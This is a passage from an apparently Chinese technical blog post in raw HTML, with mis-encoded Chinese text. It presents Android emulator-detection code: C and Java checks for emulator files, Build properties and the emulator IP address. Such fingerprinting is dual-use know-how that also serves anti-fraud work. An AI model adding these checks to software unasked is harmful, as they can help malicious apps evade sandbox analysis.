else if (file_exist(&quot;vmos.prop&quot;)) &#123;//vmosè™šæ‹Ÿæœº</span><br><span class="line">        return &quot;vmos.prop&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;fstab.titan&quot;) &amp;&amp; file_exist(&quot;init.titan.rc&quot;)) &#123;//å…‰é€Ÿè™šæ‹Ÿæœº</span><br><span class="line">        return &quot;fstab.titan&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;x8.prop&quot;)) &#123;//x8æ²™ç®±å’Œ51è™šæ‹Ÿæœº</span><br><span class="line">        return &quot;x8.prop&quot;;</span><br><span class="line">    &#125; else if (file_exist(&quot;/system/lib/libc_malloc_debug_qemu.so&quot;)) &#123;//AVD QEMU</span><br><span class="line">        return &quot;/system/lib/libc_malloc_debug_qemu.so&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    LOGD(&quot;simulator file check info not find  &quot;);</span><br><span class="line">    return &quot;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ¨¡æ‹Ÿå™¨åŸºç¡€ç‰¹å¾"><a href="#æ¨¡æ‹Ÿå™¨åŸºç¡€ç‰¹å¾" class="headerlink" title="æ¨¡æ‹Ÿå™¨åŸºç¡€ç‰¹å¾"></a>æ¨¡æ‹Ÿå™¨åŸºç¡€ç‰¹å¾</h4><p>è¿™å—æ€è·¯ä¸»è¦æ¥è‡ªéè™« ï¼Œåœ¨æ¬¡æ„Ÿè°¢ ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br></pre></td><td class="code"><pre><span class="line">      public static ListItemBean checkEmulator(Context context) &#123;</span><br><span class="line">        ArrayList&lt;String&gt; choose = new ArrayList&lt;&gt;();</span><br><span class="line">//        try &#123;</span><br><span class="line">//            String[] strArr = &#123;</span><br><span class="line">//                    &quot;/boot/bstmods/vboxguest.ko&quot;,</span><br><span class="line">//                    &quot;/boot/bstmods/vboxsf.ko&quot;,</span><br><span class="line">//                    &quot;/dev/mtp_usb&quot;,</span><br><span class="line">//                    &quot;/dev/qemu_pipe&quot;,</span><br><span class="line">//                    &quot;/dev/socket/baseband_genyd&quot;,</span><br><span class="line">//                    &quot;/dev/socket/genyd&quot;,</span><br><span class="line">//                    &quot;/dev/socket/qemud&quot;,</span><br><span class="line">//                    &quot;/dev/socket/windroyed-audio&quot;,</span><br><span class="line">//                    &quot;/dev/socket/windroyed-camera&quot;,</span><br><span class="line">//                    &quot;/dev/socket/windroyed-gps&quot;,</span><br><span class="line">//                    &quot;/dev/socket/windroyed-sensors&quot;,</span><br><span class="line">//                    &quot;/dev/vboxguest&quot;,</span><br><span class="line">//                    &quot;/dev/vboxpci&quot;,</span><br><span class="line">//                    &quot;/dev/vboxuser&quot;,</span><br><span class="line">//                    &quot;/fstab.goldfish&quot;,</span><br><span class="line">//                    &quot;/fstab.nox&quot;,</span><br><span class="line">//                    &quot;/fstab.ranchu-encrypt&quot;,</span><br><span class="line">//                    &quot;/fstab.ranchu-noencrypt&quot;,</span><br><span class="line">//                    &quot;/fstab.ttVM_x86&quot;,</span><br><span class="line">//                    &quot;/fstab.vbox86&quot;,</span><br><span class="line">//                    &quot;/init.goldfish.rc&quot;,</span><br><span class="line">//                    &quot;/init.magisk.rc&quot;,</span><br><span class="line">//                    &quot;/init.nox.rc&quot;,</span><br><span class="line">//                    &quot;/init.ranchu-encrypt.rc&quot;,</span><br><span class="line">//                    &quot;/init.ranchu-noencrypt.rc&quot;,</span><br><span class="line">//                    &quot;/init.ranchu.rc&quot;,</span><br><span class="line">//                    &quot;/init.ttVM_x86.rc&quot;,</span><br><span class="line">//                    &quot;/init.vbox86.rc&quot;,</span><br><span class="line">//                    &quot;/init.vbox86p.rc&quot;,</span><br><span class="line">//                    &quot;/init.windroye.rc&quot;,</span><br><span class="line">//                    &quot;/init.windroye.sh&quot;,</span><br><span class="line">//                    &quot;/init.x86.rc&quot;,</span><br><span class="line">//                    &quot;/proc/irq/20/vboxguest&quot;,</span><br><span class="line">//                    &quot;/sdcard/Android/data/com.redfinger.gamemanage&quot;,</span><br><span class="line">//                    &quot;/stab.andy&quot;,</span><br><span class="line">//                    &quot;/sys/bus/pci/drivers/vboxguest&quot;,</span><br><span class="line">//                    &quot;/sys/bus/pci/drivers/vboxpci&quot;,</span><br><span class="line">//                    &quot;/sys/bus/platform/drivers/qemu_pipe&quot;,</span><br><span class="line">//                    &quot;/sys/bus/platform/drivers/qemu_pipe/qemu_pipe&quot;,</span><br><span class="line">//                    &quot;/sys/bus/platform/drivers/qemu_trace&quot;,</span><br><span class="line">//                    &quot;/sys/bus/virtio/drivers/itolsvmlgtp&quot;,</span><br><span class="line">//                    &quot;/sys/bus/virtio/drivers/itoolsvmhft&quot;,</span><br><span class="line">//                    &quot;/sys/class/bdi/vboxsf-1&quot;,</span><br><span class="line">//                    &quot;/sys/class/bdi/vboxsf-2&quot;,</span><br><span class="line">//                    &quot;/sys/class/bdi/vboxsf-3&quot;,</span><br><span class="line">//                    &quot;/sys/class/misc/qemu_pipe&quot;,</span><br><span class="line">//                    &quot;/sys/class/misc/vboxguest&quot;,</span><br><span class="line">//                    &quot;/sys/class/misc/vboxuser&quot;,</span><br><span class="line">//                    &quot;/sys/devices/platform/qemu_pipe&quot;,</span><br><span class="line">//                    &quot;/sys/devices/virtual/bdi/vboxsf-1&quot;,</span><br><span class="line">//                    &quot;/sys/devices/virtual/bdi/vboxsf-2&quot;,</span><br><span class="line">//                    &quot;/sys/devices/virtual/bdi/vboxsf-3&quot;,</span><br><span class="line">//                    &quot;/sys/devices/virtual/misc/qemu_pipe&quot;,</span><br><span class="line">//                    &quot;/sys/devices/virtual/misc/vboxguest&quot;,</span><br><span class="line">//                    &quot;/sys/devices/virtual/misc/vboxpci&quot;,</span><br><span class="line">//                    &quot;/sys/devices/virtual/misc/vboxuser&quot;,</span><br><span class="line">//                    &quot;/sys/fs/selinux/booleans/in_qemu&quot;,</span><br><span class="line">//                    &quot;/sys/kernel/debug/bdi/vboxsf-1&quot;,</span><br><span class="line">//                    &quot;/sys/kernel/debug/bdi/vboxsf-2&quot;,</span><br><span class="line">//                    &quot;/sys/kernel/debug/x86&quot;,</span><br><span class="line">//                    &quot;/sys/module/qemu_trace_sysfs&quot;,</span><br><span class="line">//                    &quot;/sys/module/vboxguest&quot;,</span><br><span class="line">//                    &quot;/sys/module/vboxguest/drivers/pci:vboxguest&quot;,</span><br><span class="line">//                    &quot;/sys/module/vboxpcism&quot;,</span><br><span class="line">//                    &quot;/sys/module/vboxsf&quot;,</span><br><span class="line">//                    &quot;/sys/module/vboxvideo&quot;,</span><br><span class="line">//                    &quot;/sys/module/virtio_pt/drivers/virtio:itoolsvmhft&quot;,</span><br><span class="line">//                    &quot;/sys/module/virtio_pt_ie/drivers/virtio:itoolsvmlgtp&quot;,</span><br><span class="line">//                    &quot;/sys/qemu_trace&quot;,</span><br><span class="line">//                    &quot;/system/app/GenymotionLayout&quot;,</span><br><span class="line">//                    &quot;/system/bin/OpenglService&quot;,</span><br><span class="line">//                    &quot;/system/bin/androVM-vbox-sf&quot;,</span><br><span class="line">//                    &quot;/system/bin/droid4x&quot;,</span><br><span class="line">//                    &quot;/system/bin/droid4x-prop&quot;,</span><br><span class="line">//                    &quot;/system/bin/droid4x-vbox-sf&quot;,</span><br><span class="line">//                    &quot;/system/bin/droid4x_setprop&quot;,</span><br><span class="line">//                    &quot;/system/bin/enable_nox&quot;,</span><br><span class="line">//                    &quot;/system/bin/genymotion-vbox-sf&quot;,</span><br><span class="line">//                    &quot;/system/bin/microvirt-prop&quot;,</span><br><span class="line">//                    &quot;/system/bin/microvirt-vbox-sf&quot;,</span><br><span class="line">//                    &quot;/system/bin/microvirt_setprop&quot;,</span><br><span class="line">//                    &quot;/system/bin/microvirtd&quot;,</span><br><span class="line">//                    &quot;/system/bin/mount.vboxsf&quot;,</span><br><span class="line">//                    &quot;/system/bin/nox&quot;,</span><br><span class="line">//                    &quot;/system/bin/nox-prop&quot;,</span><br><span class="line">//                    &quot;/system/bin/nox-vbox-sf&quot;,</span><br><span class="line">//                    &quot;/system/bin/nox_setprop&quot;,</span><br><span class="line">//                    &quot;/system/bin/noxd&quot;,</span><br><span class="line">//                    &quot;/system/bin/noxscreen&quot;,</span><br><span class="line">//                    &quot;/system/bin/noxspeedup&quot;,</span><br><span class="line">//                    &quot;/system/bin/qemu-props&quot;,</span><br><span class="line">//                    &quot;/system/bin/qemud&quot;,</span><br><span class="line">//                    &quot;/system/bin/shellnox&quot;,</span><br><span class="line">//                    &quot;/system/bin/ttVM-prop&quot;,</span><br><span class="line">//                    &quot;/system/bin/windroyed&quot;,</span><br><span class="line">//                    &quot;/system/droid4x&quot;,</span><br><span class="line">//                    &quot;/system/etc/init.droid4x.sh&quot;,</span><br><span class="line">//                    &quot;/system/etc/init.tiantian.sh&quot;,</span><br><span class="line">//                    &quot;/system/lib/egl/libEGL_emulation.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/egl/libEGL_tiantianVM.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/egl/libEGL_windroye.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/egl/libGLESv1_CM_emulation.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/egl/libGLESv1_CM_tiantianVM.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/egl/libGLESv1_CM_windroye.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/egl/libGLESv2_emulation.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/egl/libGLESv2_tiantianVM.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/egl/libGLESv2_windroye.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/audio.primary.vbox86.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/audio.primary.windroye.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/audio.primary.x86.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/autio.primary.nox.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/camera.vbox86.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/camera.windroye.jpeg.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/camera.windroye.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/camera.x86.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/gps.nox.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/gps.vbox86.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/gps.windroye.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/gralloc.nox.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/gralloc.vbox86.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/gralloc.windroye.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/sensors.nox.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/sensors.vbox86.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/hw/sensors.windroye.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/init.nox.sh&quot;,</span><br><span class="line">//                    &quot;/system/lib/libGM_OpenglSystemCommon.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/libc_malloc_debug_qemu.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/libclcore_x86.bc&quot;,</span><br><span class="line">//                    &quot;/system/lib/libdroid4x.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/libnoxd.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/libnoxspeedup.so&quot;,</span><br><span class="line">//                    &quot;/system/lib/modules/3.10.30-android-x86.hd+&quot;,</span><br><span class="line">//                    &quot;/system/lib/vboxguest.ko&quot;,</span><br><span class="line">//                    &quot;/system/lib/vboxpcism.ko&quot;,</span><br><span class="line">//                    &quot;/system/lib/vboxsf.ko&quot;,</span><br><span class="line">//                    &quot;/system/lib/vboxvideo.ko&quot;,</span><br><span class="line">//                    &quot;/system/lib64/egl/libEGL_emulation.so&quot;,</span><br><span class="line">//                    &quot;/system/lib64/egl/libGLESv1_CM_emulation.so&quot;,</span><br><span class="line">//                    &quot;/system/lib64/egl/libGLESv2_emulation.so&quot;,</span><br><span class="line">//                    &quot;/vendor/lib64/egl/libEGL_emulation.so&quot;,</span><br><span class="line">//                    &quot;/vendor/lib64/egl/libGLESv1_CM_emulation.so&quot;,</span><br><span class="line">//                    &quot;/vendor/lib64/egl/libGLESv2_emulation.so&quot;,</span><br><span class="line">//                    &quot;/vendor/lib64/libandroidemu.so&quot;,</span><br><span class="line">//                    &quot;/system/lib64/hw/gralloc.ranchu.so&quot;,</span><br><span class="line">//                    &quot;/system/lib64/libc_malloc_debug_qemu.so&quot;,</span><br><span class="line">//                    &quot;/system/usr/Keylayout/droid4x_Virtual_Input.kl&quot;,</span><br><span class="line">//                    &quot;/system/usr/idc/Genymotion_Virtual_Input.idc&quot;,</span><br><span class="line">//                    &quot;/system/usr/idc/droid4x_Virtual_Input.idc&quot;,</span><br><span class="line">//                    &quot;/system/usr/idc/nox_Virtual_Input.idc&quot;,</span><br><span class="line">//                    &quot;/system/usr/idc/windroye.idc&quot;,</span><br><span class="line">//                    &quot;/system/usr/keychars/nox_gpio.kcm&quot;,</span><br><span class="line">//                    &quot;/system/usr/keychars/windroye.kcm&quot;,</span><br><span class="line">//                    &quot;/system/usr/keylayout/Genymotion_Virtual_Input.kl&quot;,</span><br><span class="line">//                    &quot;/system/usr/keylayout/nox_Virtual_Input.kl&quot;,</span><br><span class="line">//                    &quot;/system/usr/keylayout/nox_gpio.kl&quot;,</span><br><span class="line">//                    &quot;/system/usr/keylayout/windroye.kl&quot;,</span><br><span class="line">//                    &quot;system/etc/init/ndk_translation_arm64.rc&quot;,</span><br><span class="line">//                    &quot;/system/xbin/noxsu&quot;,</span><br><span class="line">//                    &quot;/ueventd.android_x86.rc&quot;,</span><br><span class="line">//                    &quot;/ueventd.andy.rc&quot;,</span><br><span class="line">//                    &quot;/ueventd.goldfish.rc&quot;,</span><br><span class="line">//                    &quot;/ueventd.nox.rc&quot;,</span><br><span class="line">//                    &quot;/ueventd.ranchu.rc&quot;,</span><br><span class="line">//                    &quot;/ueventd.ttVM_x86.rc&quot;,</span><br><span class="line">//                    &quot;/ueventd.vbox86.rc&quot;,</span><br><span class="line">//                    &quot;/vendor/lib64/libgoldfish-ril.so&quot;,</span><br><span class="line">//                    &quot;/vendor/lib64/libgoldfish_codecs_common.so&quot;,</span><br><span class="line">//                    &quot;/vendor/lib64/libstagefright_goldfish_avcdec.so&quot;,</span><br><span class="line">//                    &quot;/vendor/lib64/libstagefright_goldfish_vpxdec.so&quot;,</span><br><span class="line">//                    &quot;/x86.prop&quot;</span><br><span class="line">//            &#125;;</span><br><span class="line">//            for (int i = 0; i &lt; 7; i++) &#123;</span><br><span class="line">//                String f = strArr[i];</span><br><span class="line">//                if (new File(f).exists())</span><br><span class="line">//                    choose.add(f);</span><br><span class="line">//            &#125;</span><br><span class="line">//        &#125; catch (Exception e) &#123;</span><br><span class="line">//            e.printStackTrace();</span><br><span class="line">//        &#125;</span><br><span class="line"> </span><br><span class="line">        try &#123;</span><br><span class="line">            String[] myArr = &#123;</span><br><span class="line">                    &quot;generic&quot;,</span><br><span class="line">                    &quot;vbox&quot;</span><br><span class="line">            &#125;;</span><br><span class="line">            for (String str : myArr) &#123;</span><br><span class="line">                if (Build.FINGERPRINT.contains(str))</span><br><span class="line">                    choose.add(Build.FINGERPRINT);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        try &#123;</span><br><span class="line">            String[] myArr = &#123;</span><br><span class="line">                    &quot;google_sdk&quot;,</span><br><span class="line">                    &quot;emulator&quot;,</span><br><span class="line">                    &quot;android sdk built for&quot;,</span><br><span class="line">                    &quot;droid4x&quot;</span><br><span class="line">            &#125;;</span><br><span class="line">            for (String str : myArr) &#123;</span><br><span class="line">                if (Build.MODEL.contains(str))</span><br><span class="line">                    choose.add(Build.MODEL);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        try &#123;</span><br><span class="line">            String[] myArr = &#123;</span><br><span class="line">                    &quot;Genymotion&quot;</span><br><span class="line">            &#125;;</span><br><span class="line">            for (String str : myArr) &#123;</span><br><span class="line">                if (Build.MANUFACTURER.contains(str))</span><br><span class="line">                    choose.add(Build.MANUFACTURER);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        try &#123;</span><br><span class="line">            String[] myArr = &#123;</span><br><span class="line">                    &quot;google_sdk&quot;, &quot;sdk_phone&quot;, &quot;sdk_x86&quot;, &quot;vbox86p&quot;, &quot;nox&quot;</span><br><span class="line">            &#125;;</span><br><span class="line">            for (String str : myArr) &#123;</span><br><span class="line">                if (Build.PRODUCT.toLowerCase(Locale.ROOT).contains(str))</span><br><span class="line">                    choose.add(Build.PRODUCT);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        try &#123;</span><br><span class="line">            String[] myArr = &#123;</span><br><span class="line">                    &quot;nox&quot;</span><br><span class="line">            &#125;;</span><br><span class="line">            for (String str : myArr) &#123;</span><br><span class="line">                if (Build.BOARD.toLowerCase(Locale.ROOT).contains(str))</span><br><span class="line">                    choose.add(Build.BOARD);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        try &#123;</span><br><span class="line">            String[] myArr = &#123;</span><br><span class="line">                    &quot;nox&quot;</span><br><span class="line">            &#125;;</span><br><span class="line">            for (String str : myArr) &#123;</span><br><span class="line">                if (Build.BOOTLOADER.toLowerCase(Locale.ROOT).contains(str))</span><br><span class="line">                    choose.add(Build.BOOTLOADER);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        try &#123;</span><br><span class="line">            String[] myArr = &#123;</span><br><span class="line">                    &quot;ranchu&quot;, &quot;vbox86&quot;, &quot;goldfish&quot;</span><br><span class="line">            &#125;;</span><br><span class="line">            for (String str : myArr) &#123;</span><br><span class="line">                if (Build.HARDWARE.equalsIgnoreCase(str))</span><br><span class="line">                    choose.add(Build.HARDWARE);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        try &#123;</span><br><span class="line">            Enumeration&lt;NetworkInterface&gt; networkInterfaces = NetworkInterface.getNetworkInterfaces();</span><br><span class="line">            while (networkInterfaces.hasMoreElements()) &#123;</span><br><span class="line">                NetworkInterface ele = networkInterfaces.nextElement();</span><br><span class="line">                if (ele != null) &#123;</span><br><span class="line">                    Enumeration&lt;InetAddress&gt; inetAddresses = ele.getInetAddresses();</span><br><span class="line">                    while (inetAddresses.hasMoreElements()) &#123;</span><br><span class="line">                        InetAddress nextElement = inetAddresses.nextElement();</span><br><span class="line">                        if (!nextElement.isLoopbackAddress() &amp;&amp;</span><br><span class="line">                                (nextElement instanceof Inet4Address)) &#123;</span><br><span class="line">                            String ip = nextElement.getHostAddress();</span><br><span class="line">                            if (ip == null) continue;</span><br><span class="line">                            if (ip.equalsIgnoreCase(&quot;10.0.2.15&quot;) ||</span><br><span class="line">                      